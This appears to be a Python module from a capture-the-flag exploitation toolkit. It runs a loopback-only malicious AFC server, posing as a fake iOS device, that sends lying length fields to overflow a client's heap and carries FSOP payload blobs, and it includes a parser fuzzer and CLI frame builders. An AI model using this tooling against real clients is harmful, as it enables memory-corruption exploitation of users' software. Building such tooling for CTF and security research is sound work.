#!/usr/bin/env python3
"""Attacker-server harness for client-side (reverse-direction) pwn (B-108).

The forward pwn harness (``live_harness.py``) carries the player's bytes *to* a service. This is the
mirror: a **malicious peer** -- a loopback-only server that a client-side parser connects to, which
then feeds it crafted, lying frames. It is the Phantom-Device class: a vulnerable AFC/libimobiledevice
client that parses a fake iOS device's responses, where the device *lies on the wire* (a length field
says one thing, the real payload is another) to drive a heap overflow in the client, then a
tcache/FSOP chain reads the flag back off the socket.

What this module mechanises (the reasoning -- which length to lie, where the overflow lands -- stays
the operator's):

  * ``Protocol`` / ``Field`` -- a declarative binary frame layout whose length/size fields can be set
    to any value **independently of the real payload**: that disagreement is the lie-on-the-wire
    primitive. ``afc_protocol()`` / ``afc_packet()`` are the AFC (Apple File Conduit) preset.
  * ``AttackerServer`` -- binds 127.0.0.1 only (loopback, never a real instance), accepts a client,
    drives a scripted ``Dialog`` of ``Exchange`` turns, and logs every frame it received and sent.
  * ``fuzz_parser`` -- stands the server up under a sweep of mutated frames, runs a caller-supplied
    client against each, and classifies the client's reaction with a caller oracle: the loop that
    surfaces which lie the parser mishandles. The client is ALWAYS caller-supplied; this module never
    executes a challenge binary (rule 4) -- in a test it is a synthetic Python client, in production
    the operator's own client reached through a tunnel they set up by hand.
  * chain glue -- ``fsop_blob`` reuses ``pwn_fsop.build_fsop`` and ``afc_overflow_lengths`` reuses
    ``heap_primitives.build_integer_overflow_heap`` to turn a heap fact into the exact lying length
    fields. Byte helpers (``p64``/``flat``/``cyclic``) are re-exported from ``live_harness``.

This server never dials out and never binds a non-loopback address: it cannot reach a real challenge
instance on its own. Everything a connected client sends is DATA -- logged and returned, never
executed and never treated as an instruction.

CLI (offline only; builds frames, never listens -- the server is a library API):

  attacker_server.py protocols                     # the frame presets
  attacker_server.py afc <op> [--payload hex] [--entire N] [--this N] [--num N]
  attacker_server.py frame <spec.json>             # build a frame from a protocol spec
  attacker_server.py fsop <kind> <cfg.json>        # pwn_fsop blob packed into a lying AFC packet
"""
from __future__ import annotations

import argparse
import json
import socket
import socketserver
import sys
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable, Mapping, Sequence

HERE = Path(__file__).resolve().parent
if str(HERE) not in sys.path:
    sys.path.insert(1, str(HERE))

# Reuse the mechanical byte helpers from the forward harness rather than re-implementing them.
from live_harness import p8, p16, p32, p64, u8, u16, u32, u64, flat, cyclic, cyclic_find  # noqa: E402,F401

LOOPBACK = ("127.0.0.1", "::1", "localhost")
DEFAULT_READ_TIMEOUT = 4.0
MAX_FRAME = 16 << 20          # a built frame may not exceed 16 MiB (a loud cap, no silent truncation)


class HarnessError(RuntimeError):
    """An attacker-server problem (bad frame spec, a non-loopback bind). Loud, never silent."""


# ======================================================================================
#  Declarative frame layout with a length field that can lie.
# ======================================================================================

_INT_KINDS = ("int", "length")


@dataclass(frozen=True)
class Field:
    """One field in a binary frame.

    kind:
      - "const"  : fixed bytes (`const`), e.g. a protocol magic. Width is len(const).
      - "int"    : an unsigned integer of `width` bytes in `byteorder`. Its value is supplied at pack
                   time. A size/length field is just an "int" whose value the operator is free to set
                   to anything -- setting it to disagree with the real payload IS the lie on the wire.
      - "length" : the same as "int", but `pack()` fills it from the honest payload length unless the
                   caller overrides it. Marking a field "length" documents which int is the one to lie
                   about, and lets `pack()` build an honest frame with no manual arithmetic.
      - "payload": variable-length trailing (or inline) bytes supplied at pack time. Width is ignored.
    """
    name: str
    kind: str = "int"
    width: int = 8
    byteorder: str = "little"
    const: bytes = b""

    def __post_init__(self):
        if not self.name:
            raise HarnessError("field needs a name")
        if self.kind not in ("const", "int", "length", "payload"):
            raise HarnessError(f"unknown field kind {self.kind!r}")
        if self.kind == "const" and not isinstance(self.const, (bytes, bytearray)):
            raise HarnessError("const field needs bytes")
        if self.kind in _INT_KINDS:
            if not 1 <= int(self.width) <= 8:
                raise HarnessError(f"int field {self.name!r} width must be 1..8, got {self.width!r}")
            if self.byteorder not in ("little", "big"):
                raise HarnessError(f"int field {self.name!r} byteorder must be 'little'/'big'")

    @property
    def size(self) -> int:
        if self.kind == "const":
            return len(self.const)
        if self.kind in _INT_KINDS:
            return int(self.width)
        return 0                                   # payload: variable


@dataclass(frozen=True)
class Protocol:
    """An ordered frame layout. At most one trailing "payload" field is honoured for length maths."""
    name: str
    fields: tuple[Field, ...]

    def __post_init__(self):
        if not self.fields:
            raise HarnessError("a protocol needs at least one field")
        names = [f.name for f in self.fields]
        if len(names) != len(set(names)):
            raise HarnessError(f"duplicate field names in {self.name!r}: {names}")
        if sum(1 for f in self.fields if f.kind == "payload") > 1:
            raise HarnessError("a protocol may hold at most one payload field")

    @property
    def header_size(self) -> int:
        """Bytes of fixed-width fields (const + int/length); excludes the variable payload."""
        return sum(f.size for f in self.fields if f.kind != "payload")

    def field(self, name: str) -> Field:
        for f in self.fields:
            if f.name == name:
                return f
        raise HarnessError(f"protocol {self.name!r} has no field {name!r}")

    def pack(self, values: Mapping | None = None, *, payload: bytes = b"") -> bytes:
        """Serialise the frame.

        `values` gives the int/length/payload field values. A "length" field left out of `values` is
        filled honestly: header_size + len(payload). Supplying a "length" value that differs from that
        honest number is the lie-on-the-wire. Extra keys, a missing int field, or an int that does not
        fit its width all fail loudly.
        """
        values = dict(values or {})
        payload = _as_bytes(payload)
        known = {f.name for f in self.fields}
        extra = set(values) - known
        if extra:
            raise HarnessError(f"unknown field(s) for {self.name!r}: {sorted(extra)}")
        honest_length = self.header_size + len(payload)
        out = bytearray()
        for f in self.fields:
            if f.kind == "const":
                out += f.const
            elif f.kind == "payload":
                body = values.get(f.name, payload)
                out += _as_bytes(body)
            else:  # int / length
                if f.name in values:
                    v = values[f.name]
                elif f.kind == "length":
                    v = honest_length
                else:
                    raise HarnessError(f"int field {f.name!r} needs a value")
                if isinstance(v, bool) or not isinstance(v, int) or v < 0:
                    raise HarnessError(f"field {f.name!r} needs an unsigned int, got {v!r}")
                try:
                    out += v.to_bytes(f.width, f.byteorder)
                except OverflowError:
                    raise HarnessError(
                        f"field {f.name!r} value {v:#x} does not fit {f.width} byte(s)") from None
        if len(out) > MAX_FRAME:
            raise HarnessError(f"frame of {len(out)} bytes exceeds the {MAX_FRAME}-byte cap")
        return bytes(out)


# ---- AFC (Apple File Conduit) preset: the Phantom-Device wire format -----------------

AFC_MAGIC = b"CFA6LPAA"
AFC_HEADER_SIZE = 40                                # magic + 4 * u64

# A small, documented slice of AFC operation numbers (libimobiledevice afc.h). Values only; naming an
# op does not send anything.
AFC_OPS = {
    "status": 0x01, "data": 0x02, "read_dir": 0x03, "read_file": 0x0F,
    "write_file": 0x10, "get_file_info": 0x0A, "get_device_info": 0x0B,
}


def afc_protocol() -> Protocol:
    """The AFC packet header as a Protocol: magic, entire_length, this_length, packet_num, operation
    (all u64 little-endian) then the payload. `entire_length` is the lie field most Phantom-Device-class
    bugs trust: the client reads `entire_length - this_length` more bytes after the inline `this_length`
    portion, so an `entire_length` far past the real payload drives an over-read/overflow in the client.
    """
    return Protocol("afc", (
        Field("magic", "const", const=AFC_MAGIC),
        Field("entire_length", "length", 8, "little"),
        Field("this_length", "length", 8, "little"),
        Field("packet_num", "int", 8, "little"),
        Field("operation", "int", 8, "little"),
        Field("payload", "payload"),
    ))


def afc_packet(operation, payload: bytes = b"", *, packet_num: int = 0,
               entire_length: int | None = None, this_length: int | None = None) -> bytes:
    """Build one AFC packet, honest or lying.

    With `entire_length`/`this_length` left None both are the honest AFC_HEADER_SIZE + len(payload).
    Pass either to lie: e.g. `entire_length=0x1000, this_length=AFC_HEADER_SIZE` with a short payload
    is the classic "allocate small, read large" over-read the fake device uses. `operation` may be an
    AFC op name or an int.
    """
    op = AFC_OPS[operation] if isinstance(operation, str) else int(operation)
    payload = _as_bytes(payload)
    vals: dict = {"packet_num": int(packet_num), "operation": op, "payload": payload}
    if entire_length is not None:
        vals["entire_length"] = int(entire_length)
    if this_length is not None:
        vals["this_length"] = int(this_length)
    return afc_protocol().pack(vals, payload=payload)


# ======================================================================================
#  Scripted dialog: what the malicious server does for each client turn.
# ======================================================================================

# A responder is static bytes, or a callable (request_bytes, ctx) -> bytes that reasons about what the
# client just sent (e.g. switch the lie on a particular operation). ctx is the Connection.
Responder = "bytes | Callable[[bytes, 'Connection'], bytes]"


@dataclass(frozen=True)
class Exchange:
    """One server turn. The server optionally reads a request first, then sends a response.

    read_bytes : read exactly this many bytes before responding (framed-length read).
    read_until : read until this delimiter appears (line/prompt read).
                 Both None means the server speaks first (no read this turn).
    respond    : bytes to send, or a callable (request, connection) -> bytes.
    name       : label for the log.
    """
    respond: object
    read_bytes: int | None = None
    read_until: bytes | None = None
    name: str = ""

    def __post_init__(self):
        if self.read_bytes is not None and self.read_until is not None:
            raise HarnessError("an exchange reads by length OR by delimiter, not both")
        if self.read_bytes is not None and self.read_bytes < 0:
            raise HarnessError("read_bytes must be >= 0")
        if not (isinstance(self.respond, (bytes, bytearray)) or callable(self.respond)):
            raise HarnessError("respond must be bytes or a callable(request, connection) -> bytes")


@dataclass(frozen=True)
class Dialog:
    """An ordered script of Exchanges run on every accepted connection."""
    exchanges: tuple[Exchange, ...] = ()

    @classmethod
    def of(cls, *exchanges: Exchange) -> "Dialog":
        return cls(tuple(exchanges))


@dataclass(frozen=True)
class Event:
    """One logged frame. direction is "recv" (from the client) or "send" (the lie we fed it)."""
    t: float
    direction: str
    data: bytes
    note: str = ""


# ======================================================================================
#  The loopback-only attacker server.
# ======================================================================================

class _Handler(socketserver.BaseRequestHandler):
    def handle(self):
        srv: "AttackerServer" = self.server.harness      # type: ignore[attr-defined]
        srv._run_dialog(self.request)


class _TCPServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


class Connection:
    """State handed to a callable responder: the running total of what this client has sent, so a
    responder can branch on an earlier request without the server re-reading it."""

    def __init__(self):
        self.requests: list[bytes] = []

    @property
    def last_request(self) -> bytes:
        return self.requests[-1] if self.requests else b""


class AttackerServer:
    """A malicious peer bound to loopback, scripted to feed crafted frames to a client-side parser.

    Use as a context manager:

        dialog = Dialog.of(Exchange(read_bytes=40, respond=afc_packet("data", b"A"*64,
                                                                       entire_length=0x1000)))
        with AttackerServer(dialog) as srv:
            run_my_client(srv.host, srv.port)       # the operator's own client, never a challenge bin
            assert srv.received()                   # every frame the client sent, logged

    It binds 127.0.0.1 only; any other host is refused (it can never point at a real instance). It
    never initiates an outbound connection. `read_timeout` bounds a single blocking read so a client
    that stalls does not wedge a server thread forever.
    """

    def __init__(self, dialog: Dialog, *, host: str = "127.0.0.1",
                 clock: Callable[[], float] = time.monotonic,
                 read_timeout: float = DEFAULT_READ_TIMEOUT):
        if host not in LOOPBACK:
            raise HarnessError(
                f"attacker server binds loopback only (one of {LOOPBACK}); refusing host {host!r} so "
                f"it can never be pointed at a real instance")
        if not isinstance(dialog, Dialog):
            raise HarnessError("dialog must be a Dialog")
        self.dialog = dialog
        self.bind_host = "127.0.0.1" if host == "localhost" else host
        self.clock = clock
        self.read_timeout = float(read_timeout)
        self.log: list[Event] = []
        self.connections = 0
        self._lock = threading.Lock()
        self._server: _TCPServer | None = None
        self._thread: threading.Thread | None = None

    # -- lifecycle --------------------------------------------------------------------
    @property
    def host(self) -> str:
        return self.bind_host

    @property
    def port(self) -> int:
        if self._server is None:
            raise HarnessError("server is not running (use it as a context manager)")
        return self._server.server_address[1]

    @property
    def addr(self) -> tuple[str, int]:
        return (self.host, self.port)

    def __enter__(self) -> "AttackerServer":
        family = socket.AF_INET6 if ":" in self.bind_host else socket.AF_INET
        # Per-instance server class so address_family is this server's own, not a shared mutable on
        # _TCPServer: two servers of different families can run at once without racing the attribute.
        server_cls = type("_AttackerTCPServer", (_TCPServer,), {"address_family": family})
        self._server = server_cls((self.bind_host, 0), _Handler)
        self._server.harness = self                     # type: ignore[attr-defined]
        self._thread = threading.Thread(target=self._server.serve_forever,
                                        name="attacker-server", daemon=True)
        self._thread.start()
        return self

    def __exit__(self, *exc) -> None:
        if self._server is not None:
            self._server.shutdown()
            self._server.server_close()
            self._server = None

    # -- logging queries --------------------------------------------------------------
    def _record(self, direction: str, data: bytes, note: str = "") -> None:
        with self._lock:
            self.log.append(Event(self.clock(), direction, bytes(data), note))

    def received(self) -> list[bytes]:
        with self._lock:
            return [e.data for e in self.log if e.direction == "recv"]

    def sent(self) -> list[bytes]:
        with self._lock:
            return [e.data for e in self.log if e.direction == "send"]

    # -- the scripted conversation ----------------------------------------------------
    def _run_dialog(self, sock: socket.socket) -> None:
        with self._lock:
            self.connections += 1
        ctx = Connection()
        sock.settimeout(self.read_timeout)
        try:
            for ex in self.dialog.exchanges:
                if ex.read_bytes is not None or ex.read_until is not None:
                    req = self._read(sock, ex)
                    ctx.requests.append(req)
                    self._record("recv", req, ex.name)
                    if not req and (ex.read_bytes or ex.read_until):
                        return                         # client hung up before this turn's request
                resp = ex.respond(ctx.last_request, ctx) if callable(ex.respond) else ex.respond
                resp = _as_bytes(resp)
                self._record("send", resp, ex.name)
                sock.sendall(resp)
        except (socket.timeout, ConnectionError, OSError):
            return                                      # a client drop ends this connection, logged so far

    def _read(self, sock: socket.socket, ex: Exchange) -> bytes:
        if ex.read_bytes is not None:
            buf = b""
            while len(buf) < ex.read_bytes:
                chunk = sock.recv(ex.read_bytes - len(buf))
                if not chunk:
                    break
                buf += chunk
            return buf
        delim = ex.read_until
        buf = b""
        while delim not in buf:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
        return buf


# ======================================================================================
#  Parser fuzzer: sweep lying frames, run a client, classify its reaction.
# ======================================================================================

@dataclass(frozen=True)
class FuzzFinding:
    mutation: object             # the mutation that produced this run (opaque to the harness)
    verdict: str                 # the oracle's label; "anomaly" is treated as a candidate bug
    received: tuple              # frames the client sent to the server during the run
    detail: object = None        # whatever the oracle returned alongside the verdict

    @property
    def anomalous(self) -> bool:
        return self.verdict == ANOMALY


NORMAL = "normal"
ANOMALY = "anomaly"


@dataclass(frozen=True)
class FuzzReport:
    findings: tuple[FuzzFinding, ...]

    @property
    def anomalies(self) -> list[FuzzFinding]:
        return [f for f in self.findings if f.anomalous]

    def __len__(self) -> int:
        return len(self.findings)


Oracle = Callable[[object, AttackerServer, object], object]


def fuzz_parser(dialog_for: Callable[[object], Dialog],
                client: Callable[[str, int], object],
                mutations: Sequence,
                oracle: Oracle, *,
                host: str = "127.0.0.1",
                read_timeout: float = DEFAULT_READ_TIMEOUT) -> FuzzReport:
    """Run `client` against the attacker server once per mutation and record the oracle's verdict.

    For each item in `mutations`, `dialog_for(mutation)` builds the scripted (lying) Dialog; a fresh
    loopback AttackerServer is stood up; `client(host, port)` is invoked -- this is the caller's own
    client (synthetic in tests, the operator's real client in production), NEVER a challenge binary;
    then `oracle(mutation, server, client_result)` returns a verdict. A verdict equal to ANOMALY (or a
    (verdict, detail) pair whose verdict is ANOMALY) flags that mutation as a candidate parser bug.

    The loop is bounded by len(mutations) and does no timing, so it is deterministic under load.
    """
    findings = []
    for mutation in mutations:
        dialog = dialog_for(mutation)
        if not isinstance(dialog, Dialog):
            raise HarnessError("dialog_for must return a Dialog")
        with AttackerServer(dialog, host=host, read_timeout=read_timeout) as srv:
            result = client(srv.host, srv.port)
            verdict = oracle(mutation, srv, result)
            received = tuple(srv.received())
        detail = None
        if isinstance(verdict, tuple) and len(verdict) == 2:
            verdict, detail = verdict
        if verdict not in (NORMAL, ANOMALY):
            raise HarnessError(f"oracle must return {NORMAL!r}/{ANOMALY!r} (optionally with a detail), "
                               f"got {verdict!r}")
        findings.append(FuzzFinding(mutation, verdict, received, detail))
    return FuzzReport(tuple(findings))


# ---- mutation generators -------------------------------------------------------------

def length_sweep(buffer_size: int, *, width: int = 8, span: int = 4) -> list[int]:
    """Declared-length values that bracket a client buffer boundary: just under, exactly at, and over
    `buffer_size`. These are the lengths to lie about when probing a fixed-size read buffer. `span`
    values are emitted on each side of the boundary (plus the boundary itself)."""
    if buffer_size < 0 or width < 1 or span < 0:
        raise HarnessError("length_sweep needs buffer_size>=0, width>=1, span>=0")
    cap = (1 << (8 * width)) - 1
    out = []
    for delta in range(-span, span + 1):
        v = buffer_size + delta
        if 0 <= v <= cap and v not in out:
            out.append(v)
    return out


def boundary_values(width: int) -> list[int]:
    """Integer-width boundary values (0, 1, 2^(w-1)-1/2^(w-1), max-1, max) -- the classic off-by/wrap
    probes for a size field of `width` bytes."""
    if not 1 <= width <= 8:
        raise HarnessError("boundary_values width must be 1..8")
    bits = 8 * width
    cap = (1 << bits) - 1
    half = 1 << (bits - 1)
    cand = [0, 1, half - 1, half, cap - 1, cap]
    out = []
    for v in cand:
        if 0 <= v <= cap and v not in out:
            out.append(v)
    return out


# ======================================================================================
#  Chain glue: reuse pwn_fsop and heap_primitives to turn a heap fact into wire lies.
# ======================================================================================

def fsop_blob(kind: str, glibc_version: str, **config) -> bytes:
    """The FSOP placement blob from pwn_fsop.build_fsop, as raw bytes to carry in a frame payload.

    Thin reuse: pwn_fsop owns the _IO_FILE/_IO_wide_data layout and offsets. A build whose segments do
    not reduce to one contiguous blob (addresses too far apart) is refused here, loudly."""
    import pwn_fsop
    build = pwn_fsop.build_fsop(kind, glibc_version, **config)
    if build.blob is None:
        raise HarnessError(
            f"pwn_fsop {kind!r} build has no contiguous blob (segments span too wide); place the "
            f"segments individually via pwn_fsop instead")
    return build.blob


def afc_overflow_packet(kind: str, glibc_version: str, *, this_length: int = AFC_HEADER_SIZE,
                        operation="data", packet_num: int = 0, **config) -> bytes:
    """An AFC packet whose payload is an FSOP blob and whose `entire_length` lies about the real size
    (so the client reads the whole blob past its `this_length` inline window). The returned bytes are
    the exact frame a scripted Exchange would send; nothing is delivered here."""
    blob = fsop_blob(kind, glibc_version, **config)
    entire = AFC_HEADER_SIZE + len(blob)
    return afc_packet(operation, blob, packet_num=packet_num,
                      entire_length=entire, this_length=this_length)


def afc_overflow_lengths(*, count: int, element_size: int, copy_count: int,
                         integer_bits: int = 32, header_addr: int = 0x1000) -> dict:
    """Turn a multiplication-wrap heap fact into the lying AFC length fields.

    Reuses heap_primitives.build_integer_overflow_heap for the wrap arithmetic: `count * element_size`
    truncates at `integer_bits`, so a client that sizes its buffer from the truncated product allocates
    only `wrapped` bytes, while `copy_count * element_size` (`copy_bytes`) are actually copied. Maps
    that fact onto the wire: `this_length` is the header plus the small wrapped allocation (the inline
    window), `entire_length` is the header plus the full `copy_bytes` the client is tricked into
    reading. Returns {this_length, entire_length, wrapped_allocation, copy_bytes, overflow_bytes}.
    `header_addr` only satisfies the primitive's non-zero address check."""
    import heap_primitives
    build = heap_primitives.build_integer_overflow_heap(
        header_addr=header_addr, count=count, element_size=element_size,
        copy_count=copy_count, integer_bits=integer_bits)
    wrapped = int(build.metadata["wrapped_allocation"])
    copy_bytes = int(build.metadata["copy_bytes"])
    overflow = int(build.metadata["overflow_bytes"])
    return {
        "this_length": AFC_HEADER_SIZE + wrapped,
        "entire_length": AFC_HEADER_SIZE + copy_bytes,
        "wrapped_allocation": wrapped,
        "copy_bytes": copy_bytes,
        "overflow_bytes": overflow,
    }


# ======================================================================================
#  helpers
# ======================================================================================

def _as_bytes(x) -> bytes:
    if isinstance(x, str):
        return x.encode()
    if isinstance(x, (bytes, bytearray, memoryview)):
        return bytes(x)
    raise HarnessError(f"expected bytes/str, got {type(x).__name__}")


def _protocol_from_spec(spec: Mapping) -> Protocol:
    """Build a Protocol from a JSON spec: {"name":..., "fields":[{"name","kind",...}, ...]}."""
    if not isinstance(spec, Mapping) or "fields" not in spec:
        raise HarnessError("protocol spec needs a 'fields' list")
    fields = []
    for raw in spec["fields"]:
        if not isinstance(raw, Mapping) or "name" not in raw:
            raise HarnessError("each field needs a name")
        kind = raw.get("kind", "int")
        const = bytes.fromhex(raw["const"]) if raw.get("const") else b""
        fields.append(Field(raw["name"], kind, int(raw.get("width", 8)),
                            raw.get("byteorder", "little"), const))
    return Protocol(str(spec.get("name", "custom")), tuple(fields))


# ======================================================================================
#  CLI (offline: builds frames, never listens)
# ======================================================================================

def _cli_protocols() -> int:
    print("afc: " + ", ".join(f.name for f in afc_protocol().fields))
    print("afc ops: " + ", ".join(f"{k}={v:#x}" for k, v in AFC_OPS.items()))
    print("custom: pass a JSON spec to `frame`")
    return 0


def _cli_afc(argv: list[str]) -> int:
    p = argparse.ArgumentParser(prog="attacker_server.py afc")
    p.add_argument("operation")
    p.add_argument("--payload", default="", help="payload as hex")
    p.add_argument("--entire", type=lambda s: int(s, 0))
    p.add_argument("--this", type=lambda s: int(s, 0))
    p.add_argument("--num", type=lambda s: int(s, 0), default=0)
    a = p.parse_args(argv)
    op = AFC_OPS.get(a.operation, None)
    op = op if op is not None else int(a.operation, 0)
    payload = bytes.fromhex(a.payload) if a.payload else b""
    frame = afc_packet(op, payload, packet_num=a.num, entire_length=a.entire, this_length=a.this)
    sys.stdout.write(frame.hex() + "\n")
    return 0


def _cli_frame(path: str) -> int:
    spec = json.loads(Path(path).read_text())
    proto = _protocol_from_spec(spec)
    values = dict(spec.get("values", {}))
    for k, v in list(values.items()):
        if isinstance(v, str) and proto.field(k).kind == "payload":
            values[k] = bytes.fromhex(v)
    payload = bytes.fromhex(spec["payload"]) if spec.get("payload") else b""
    sys.stdout.write(proto.pack(values, payload=payload).hex() + "\n")
    return 0


def _cli_fsop(kind: str, path: str) -> int:
    cfg = json.loads(Path(path).read_text())
    version = str(cfg.pop("glibc_version"))
    this_length = int(cfg.pop("this_length", AFC_HEADER_SIZE))
    frame = afc_overflow_packet(kind, version, this_length=this_length, **cfg)
    sys.stdout.write(frame.hex() + "\n")
    return 0


def main(argv: list[str]) -> int:
    if not argv:
        print("usage: attacker_server.py protocols | afc <op> [...] | frame <spec.json> | "
              "fsop <kind> <cfg.json>", file=sys.stderr)
        return 2
    cmd, rest = argv[0], argv[1:]
    try:
        if cmd == "protocols":
            return _cli_protocols()
        if cmd == "afc":
            return _cli_afc(rest)
        if cmd == "frame":
            if not rest:
                print("usage: attacker_server.py frame <spec.json>", file=sys.stderr)
                return 2
            return _cli_frame(rest[0])
        if cmd == "fsop":
            if len(rest) < 2:
                print("usage: attacker_server.py fsop <kind> <cfg.json>", file=sys.stderr)
                return 2
            return _cli_fsop(rest[0], rest[1])
    except (HarnessError, OSError, ValueError, KeyError, TypeError) as exc:
        print(f"attacker_server: {exc}", file=sys.stderr)
        return 2
    print(f"unknown command {cmd!r}; use: protocols | afc | frame | fsop", file=sys.stderr)
    return 2


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
